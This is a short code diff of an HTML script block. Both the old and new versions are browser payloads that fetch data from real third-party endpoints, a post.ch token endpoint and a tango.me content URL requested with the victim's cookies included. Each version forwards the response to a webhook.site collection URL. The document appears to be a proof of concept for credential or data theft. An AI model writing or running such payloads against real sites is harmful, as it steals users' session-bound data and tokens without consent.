@@ -1,15 +1,20 @@
 <script>
-  fetch('https://example1.post.ch/coveo/rest/token')
-    .then(response => response.text())
-    .then(data => {
-      // Replace with your webhook URL to capture data
-      fetch('https://webhook.site/5beb3f37-64a6-4b44-aa9b-372678d00ba8', {
+  fetch('https://gateway.tango.me/securecontent/RyVCwhlwzKIhFpygdY0nNFoa3U9I6JPQtqnxPCkasXu7XcuTWO1Bl0BhnQyHacRdJg_BcDTc100ft72aXz-ZX-1ctg3c96a5LB0Pfkg0BjQ', {
+    credentials: 'include'  // Necessary to include cookies in the request
+  })
+  .then(response => response.blob()) // Assuming the content is not purely text
+  .then(blob => {
+    const reader = new FileReader();
+    reader.onload = function() {
+      fetch('https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5', {
         method: 'POST',
-        body: JSON.stringify(data)
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ data: this.result })  // Sending the data as JSON
       });
-    })
-    .catch(error => console.error('Error:', error));
+    };
+    reader.readAsText(blob);  // Read the response as text
+  })
+  .catch(error => console.error('Error:', error));
 </script>
-
-
-
